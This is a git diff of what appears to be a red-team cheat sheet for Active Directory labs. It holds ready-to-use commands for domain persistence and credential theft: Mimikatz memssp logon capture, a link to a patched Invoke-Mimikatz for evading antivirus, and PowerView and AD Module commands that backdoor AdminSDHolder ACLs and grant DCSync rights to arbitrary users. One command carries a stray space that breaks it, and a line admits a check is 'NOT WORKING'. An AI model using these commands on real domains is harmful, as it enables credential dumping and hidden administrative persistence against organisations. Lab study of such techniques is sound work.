@@ -268,6 +268,7 @@ misc::skeleton
  
 ```Invoke-Mimikatz -Command '"misc::memssp"'``` - Logs local logons to C:\Windows\system32\kiwissp.log
 
+* * *
 
 #### Patch script if VirtualAlloc Error
 Patched script working available here - [Tool dump](https://github.com/conma293/mvp) 
@@ -283,14 +284,14 @@ https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invok
 
 ```Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Josh -Rights All -Verbose``` - PowerView
 
-```Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=bcorp,DC=ecorp,D C=lab' -Principal student1 -Verbose``` - AD Module
+```Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=bcorp,DC=ecorp,DC=lab' -Principal Josh -Verbose``` - AD Module
 
+#### Domain Replication Privileges 
+•  Add DCSync permissions ("Domain Replication" rights) for an arbitrary user 
 
-•  Add DCSync permissions ("DC Replication" rights) for an arbitrary user to AdminSDHolder 
+```Add-ObjectAcl -TargetDistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' - PrincipalSamAccountName Mary -Rights DCSync -Verbose``` - PowerView
 
-```Add-ObjectAcl -TargetDistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' - PrincipalSamAccountName bob -Rights DCSync -Verbose``` - PowerView
-
-```Set-ADACL -DistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -Principal bob -GUIDRight DCSync -Verbose``` - AD Module
+```Set-ADACL -DistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -GUIDRight DCSync -Verbose``` - AD Module
 
 Check ACLs:
 NOT WORKING!!
